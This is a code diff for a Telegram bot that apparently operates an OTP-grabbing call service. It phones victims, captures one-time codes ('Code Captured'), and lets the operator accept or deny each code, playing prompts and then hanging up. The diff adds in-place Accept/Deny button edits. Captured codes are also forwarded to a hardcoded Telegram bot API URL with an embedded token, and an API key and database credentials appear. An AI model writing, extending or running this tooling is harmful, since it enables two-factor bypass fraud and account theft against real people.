@@ -35,6 +35,7 @@ apiKey = '741852963741852963789456123'
 last_message_ids = {}
 ringing_handler = []
 recording_handler = {}
+last_accept_deny = {}
 
 
 updater = Updater(token=bot_tkn, use_context=True)
@@ -906,6 +907,7 @@ def recall_now(message):
 
 #--------------------------------custom---CALL WEBHOOK-------------------------------------------------------
 def custom_confirm1(message,otp_message):
+    global last_accept_deny
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor() 
     chat_id = message.from_user.id
@@ -924,6 +926,12 @@ def custom_confirm1(message,otp_message):
     call_control_id  = custom_cont[1]
 
     if up_resp1=='Accept':
+        message_id1 = last_accept_deny[str(chat_id)]
+        new_keyboard = types.InlineKeyboardMarkup(row_width=1)
+        new_item = types.InlineKeyboardButton(text="Accepted ✅", callback_data="accepted")
+        new_keyboard.add(new_item)
+        bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id1, reply_markup=new_keyboard)
+
         url = 'https://articunoapi.com:8443/play-audio'
         data = {
     "uuid": f"{call_control_id}",
@@ -931,13 +939,16 @@ def custom_confirm1(message,otp_message):
    
 }
         requests.post(url, json=data)
-        bot.send_message(chat_id,f"*Code Accpeted ✅ *",parse_mode='markdown')
-        time.sleep(10)
+        time.sleep(7)
         callhangup(call_control_id)
 
 
     elif up_resp1=='Deny':
-        bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown')
+        message_id2 = last_accept_deny[str(chat_id)]
+        new_keyboard = types.InlineKeyboardMarkup(row_width=1)
+        new_item = types.InlineKeyboardButton(text="Denied ❌", callback_data="denied")
+        new_keyboard.add(new_item)
+        bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id2, reply_markup=new_keyboard)
         url = 'https://articunoapi.com:8443/gather-audio'
         data = {
     "uuid": f"{call_control_id}",
@@ -955,6 +966,7 @@ def custom_confirm1(message,otp_message):
 def custom_prebuild_script_call(script_id,chatid):
     global ringing_handler 
     global recording_handler
+    global last_accept_deny
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     data = request.get_json()
@@ -1053,7 +1065,8 @@ def custom_prebuild_script_call(script_id,chatid):
             item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept")
             item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
             keyboard.add(item1,item2) 
-            bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
+            message_idd = bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard).message_id
+            last_accept_deny[str(chatid)] = message_idd
             requests.post(
     "https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage",
     data={
@@ -1079,6 +1092,7 @@ def custom_prebuild_script_call(script_id,chatid):
 
 #--------------------------------ALPHA---CALL WEBHOOK-------------------------------------------------------
 def aplha_confirm1(message,otp_message):
+    global last_accept_deny
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor() 
     chat_id = message.from_user.id
@@ -1097,6 +1111,12 @@ def aplha_confirm1(message,otp_message):
     call_control_id  = custom_cont[1]
 
     if up_resp1=='Accept':
+        message_id1 = last_accept_deny[str(chat_id)]
+        new_keyboard = types.InlineKeyboardMarkup(row_width=1)
+        new_item = types.InlineKeyboardButton(text="Accepted ✅", callback_data="accepted")
+        new_keyboard.add(new_item)
+        bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id1, reply_markup=new_keyboard)
+
         url = 'https://articunoapi.com:8443/play-audio'
         data = {
     "uuid": f"{call_control_id}",
@@ -1109,6 +1129,12 @@ def aplha_confirm1(message,otp_message):
 
 
     elif up_resp1=='Deny':
+        message_id2 = last_accept_deny[str(chat_id)]
+        new_keyboard = types.InlineKeyboardMarkup(row_width=1)
+        new_item = types.InlineKeyboardButton(text="Denied ❌", callback_data="denied")
+        new_keyboard.add(new_item)
+        bot.edit_message_reply_markup(chat_id=chat_id, message_id=message_id2, reply_markup=new_keyboard)
+
         url = 'https://articunoapi.com:8443/play-audio'
         data = {
     "uuid": f"{call_control_id}",
@@ -1127,6 +1153,7 @@ def aplha_confirm1(message,otp_message):
 def aplha_prebuild_script_call(script_id,chatid):
     global ringing_handler 
     global recording_handler
+    global last_accept_deny
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
     data = request.get_json()
@@ -1233,7 +1260,8 @@ def aplha_prebuild_script_call(script_id,chatid):
                 item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept_alpha")
                 item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny_alpha")
                 keyboard.add(item1,item2) 
-                bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard)
+                message_idd = bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>""",parse_mode='HTML',reply_markup=keyboard).message_id
+                last_accept_deny[str(chatid)] = message_idd
                 requests.post(
     "https://api.telegram.org/bot7289161960:AAGqVenb4JrHLzK60YKFBcmBmq3jdhMcpx0/sendMessage",
     data={
